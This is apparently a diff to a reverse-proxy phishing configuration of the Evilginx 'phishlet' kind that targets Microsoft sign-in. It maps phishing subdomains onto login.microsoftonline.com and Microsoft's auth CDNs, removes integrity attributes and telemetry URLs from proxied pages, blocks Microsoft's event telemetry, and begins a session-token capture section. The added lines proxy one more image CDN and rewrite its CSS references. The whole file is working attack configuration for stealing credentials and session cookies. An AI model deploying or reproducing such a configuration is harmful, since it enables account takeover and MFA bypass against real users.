@@ -14,11 +14,13 @@ proxy_hosts:
   - {phish_sub: 'events', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: true, is_landing: false}
   - {phish_sub: 'cdn-2', orig_sub: 'aadcdn', domain: 'msauth.net', session: true, is_landing: false}
   - {phish_sub: 'cdn-3', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
+  - {phish_sub: 'cdn-4', orig_sub: 'aadcdn', domain: 'msftauthimages.net', session: true, is_landing: false}
 sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity="[^"]*"', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity=''[^'']*''', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'aadcdn', domain: 'msftauth.net', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msftauthimages.net', orig_sub: 'aadcdn', domain: 'msftauthimages.net', search: '\.cloudfront\.net', replace: '.nowhere.local', mimes: ['text/css']}
 intercept:
   - {domain: 'browser.events.data.microsoft.com', path: '.*', http_status: 403, mime: "application/json"}
 auth_tokens:
